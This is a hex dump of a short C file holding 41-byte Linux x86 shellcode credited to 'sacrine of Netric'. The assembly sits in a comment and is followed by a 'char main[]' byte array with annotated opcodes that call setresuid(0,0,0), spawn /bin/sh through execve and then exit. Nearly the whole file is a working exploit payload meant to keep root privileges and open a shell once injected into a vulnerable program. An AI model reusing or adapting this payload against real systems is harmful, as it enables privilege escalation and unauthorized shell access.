00000000  2f 2a 20 6c 69 6e 75 78  20 78 38 36 20 73 68 65  |/* linux x86 she|
00000010  6c 6c 63 6f 64 65 28 34  31 20 62 79 74 65 73 29  |llcode(41 bytes)|
00000020  20 62 79 20 73 61 63 72  69 6e 65 20 6f 66 20 4e  | by sacrine of N|
00000030  65 74 72 69 63 20 28 77  77 77 2e 6e 65 74 72 69  |etric (www.netri|
00000040  63 2e 6f 72 67 29 0d 0a  20 2a 20 73 65 74 72 65  |c.org).. * setre|
00000050  73 75 69 64 28 30 2c 30  2c 30 29 3b 20 65 78 65  |suid(0,0,0); exe|
00000060  63 76 65 20 2f 62 69 6e  2f 73 68 3b 20 65 78 69  |cve /bin/sh; exi|
00000070  74 3b 0d 0a 20 2a 0d 0a  0d 0a 20 20 20 20 20 20  |t;.. *....      |
00000080  20 20 5f 5f 61 73 6d 28  22 20 78 6f 72 6c 20 25  |  __asm(" xorl %|
00000090  65 61 78 2c 25 65 61 78  0d 0a 20 20 20 20 20 20  |eax,%eax..      |
000000a0  20 20 20 20 20 20 20 20  20 20 78 6f 72 6c 20 25  |          xorl %|
000000b0  65 62 78 2c 25 65 62 78  0d 0a 20 20 20 20 20 20  |ebx,%ebx..      |
000000c0  20 20 20 20 20 20 20 20  20 20 78 6f 72 6c 20 25  |          xorl %|
000000d0  65 63 78 2c 25 65 63 78  0d 0a 20 20 20 20 20 20  |ecx,%ecx..      |
000000e0  20 20 20 20 20 20 20 20  20 20 63 64 71 0d 0a 20  |          cdq.. |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000100  6f 76 62 20 24 30 78 61  34 2c 20 25 61 6c 0d 0a  |ovb $0xa4, %al..|
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  69 6e 74 20 24 30 78 38  30 0d 0a 0d 0a 20 20 20  |int $0x80....   |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000140  6c 20 25 65 61 78 2c 25  65 61 78 0d 0a 20 20 20  |l %eax,%eax..   |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000160  68 20 25 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |h %eax..        |
00000170  20 20 20 20 20 20 20 20  70 75 73 68 6c 20 20 20  |        pushl   |
00000180  24 30 78 36 38 37 33 32  66 32 66 0d 0a 20 20 20  |$0x68732f2f..   |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
000001a0  68 6c 20 20 20 24 30 78  36 65 36 39 36 32 32 66  |hl   $0x6e69622f|
000001b0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000001c0  20 20 6d 6f 76 20 25 65  73 70 2c 20 25 65 62 78  |  mov %esp, %ebx|
000001d0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000001e0  20 20 70 75 73 68 20 25  65 61 78 0d 0a 20 20 20  |  push %eax..   |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000200  68 20 25 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |h %ebx..        |
00000210  20 20 20 20 20 20 20 20  6c 65 61 20 28 25 65 73  |        lea (%es|
00000220  70 2c 31 29 2c 25 65 63  78 0d 0a 20 20 20 20 20  |p,1),%ecx..     |
00000230  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |           movb |
00000240  24 30 78 62 2c 20 25 61  6c 0d 0a 20 20 20 20 20  |$0xb, %al..     |
00000250  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 24  |           int $|
00000260  30 78 38 30 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |0x80....        |
00000270  20 20 20 20 20 20 20 20  78 6f 72 6c 20 25 65 61  |        xorl %ea|
00000280  78 2c 25 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |x,%eax..        |
00000290  20 20 20 20 20 20 20 20  6d 6f 76 20 20 24 30 78  |        mov  $0x|
000002a0  31 2c 20 25 61 6c 0d 0a  20 20 20 20 20 20 20 20  |1, %al..        |
000002b0  20 20 20 20 20 20 20 20  69 6e 74 20 24 30 78 38  |        int $0x8|
000002c0  30 0d 0a 22 29 3b 20 0d  0a 0d 0a 2a 2f 0d 0a 0d  |0.."); ....*/...|
000002d0  0a 63 68 61 72 20 6d 61  69 6e 5b 5d 3d 0d 0a 20  |.char main[]=.. |
000002e0  20 20 20 20 20 20 20 2f  2f 20 73 65 74 72 65 73  |       // setres|
000002f0  75 69 64 28 30 2c 30 2c  30 29 3b 0d 0a 0d 0a 20  |uid(0,0,0);.... |
00000300  20 20 20 20 20 20 20 22  5c 78 33 31 5c 78 63 30  |       "\x31\xc0|
00000310  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000320  2f 20 78 6f 72 20 20 25  65 61 78 2c 25 65 61 78  |/ xor  %eax,%eax|
00000330  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 33 31 5c  |..        "\x31\|
00000340  78 64 62 22 20 20 20 20  20 20 20 20 20 20 20 20  |xdb"            |
00000350  20 20 2f 2f 20 78 6f 72  20 20 25 65 62 78 2c 25  |  // xor  %ebx,%|
00000360  65 62 78 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |ebx..        "\x|
00000370  33 31 5c 78 63 39 22 20  20 20 20 20 20 20 20 20  |31\xc9"         |
00000380  20 20 20 20 20 2f 2f 20  78 6f 72 20 20 25 65 63  |     // xor  %ec|
00000390  78 2c 25 65 63 78 0d 0a  20 20 20 20 20 20 20 20  |x,%ecx..        |
000003a0  22 5c 78 39 39 22 20 20  20 20 20 20 20 20 20 20  |"\x99"          |
000003b0  20 20 20 20 20 20 20 20  2f 2f 20 63 64 71 0d 0a  |        // cdq..|
000003c0  20 20 20 20 20 20 20 20  22 5c 78 62 30 5c 78 61  |        "\xb0\xa|
000003d0  34 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |4"              |
000003e0  2f 2f 20 6d 6f 76 20 20  24 30 78 61 34 2c 20 25  |// mov  $0xa4, %|
000003f0  61 6c 0d 0a 20 20 20 20  20 20 20 20 22 5c 78 63  |al..        "\xc|
00000400  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00000410  20 20 20 20 2f 2f 20 69  6e 74 20 20 24 30 78 38  |    // int  $0x8|
00000420  30 0d 0a 0d 0a 20 20 20  20 20 20 20 20 2f 2f 20  |0....        // |
00000430  65 78 65 63 76 65 20 2f  62 69 6e 2f 73 68 0d 0a  |execve /bin/sh..|
00000440  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 33 31 5c  |..        "\x31\|
00000450  78 63 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xc0"            |
00000460  20 20 20 20 20 20 20 20  20 20 2f 2f 20 78 6f 72  |          // xor|
00000470  20 20 20 20 25 65 61 78  2c 25 65 61 78 0d 0a 20  |    %eax,%eax.. |
00000480  20 20 20 20 20 20 20 22  5c 78 35 30 22 20 20 20  |       "\x50"   |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
000004b0  20 25 65 61 78 0d 0a 20  20 20 20 20 20 20 20 22  | %eax..        "|
000004c0  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 37 33  |\x68\x2f\x2f\x73|
000004d0  5c 78 36 38 22 20 20 20  20 20 20 20 20 20 20 2f  |\x68"          /|
000004e0  2f 20 70 75 73 68 20 20  20 24 30 78 36 38 37 33  |/ push   $0x6873|
000004f0  32 66 32 66 0d 0a 20 20  20 20 20 20 20 20 22 5c  |2f2f..        "\|
00000500  78 36 38 5c 78 32 66 5c  78 36 32 5c 78 36 39 5c  |x68\x2f\x62\x69\|
00000510  78 36 65 22 20 20 20 20  20 20 20 20 20 20 2f 2f  |x6e"          //|
00000520  20 70 75 73 68 20 20 20  24 30 78 36 65 36 39 36  | push   $0x6e696|
00000530  32 32 66 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |22f..        "\x|
00000540  38 39 5c 78 65 33 22 20  20 20 20 20 20 20 20 20  |89\xe3"         |
00000550  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000560  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 62 78  |mov    %esp,%ebx|
00000570  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 35 30 22  |..        "\x50"|
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000590  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
000005a0  68 20 20 20 25 65 61 78  0d 0a 20 20 20 20 20 20  |h   %eax..      |
000005b0  20 20 22 5c 78 35 33 22  20 20 20 20 20 20 20 20  |  "\x53"        |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005d0  20 20 2f 2f 20 70 75 73  68 20 20 20 25 65 62 78  |  // push   %ebx|
000005e0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 38 64 5c  |..        "\x8d\|
000005f0  78 30 63 5c 78 32 34 22  20 20 20 20 20 20 20 20  |x0c\x24"        |
00000600  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6c 65 61  |          // lea|
00000610  20 20 20 20 28 25 65 73  70 2c 31 29 2c 25 65 63  |    (%esp,1),%ec|
00000620  78 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 62 30  |x..        "\xb0|
00000630  5c 78 30 62 22 20 20 20  20 20 20 20 20 20 20 20  |\x0b"           |
00000640  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000650  76 20 20 20 20 24 30 78  62 2c 25 61 6c 0d 0a 20  |v    $0xb,%al.. |
00000660  20 20 20 20 20 20 20 22  5c 78 63 64 5c 78 38 30  |       "\xcd\x80|
00000670  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000680  20 20 20 20 20 20 20 2f  2f 20 69 6e 74 20 20 20  |       // int   |
00000690  20 24 30 78 38 30 0d 0a  0d 0a 20 20 20 20 20 20  | $0x80....      |
000006a0  20 20 2f 2f 20 65 78 69  74 0d 0a 0d 0a 20 20 20  |  // exit....   |
000006b0  20 20 20 20 20 22 5c 78  33 31 5c 78 63 30 22 20  |     "\x31\xc0" |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000006d0  78 6f 72 6c 20 25 65 61  78 2c 25 65 61 78 0d 0a  |xorl %eax,%eax..|
000006e0  20 20 20 20 20 20 20 20  22 5c 78 62 30 5c 78 30  |        "\xb0\x0|
000006f0  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000700  2f 2f 20 6d 6f 76 62 20  24 30 78 31 2c 20 25 61  |// movb $0x1, %a|
00000710  6c 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 63 64  |l..        "\xcd|
00000720  5c 78 38 30 22 3b 20 20  20 20 20 20 20 20 20 20  |\x80";          |
00000730  20 20 20 2f 2f 20 69 6e  74 20 20 24 30 78 38 30  |   // int  $0x80|
00000740
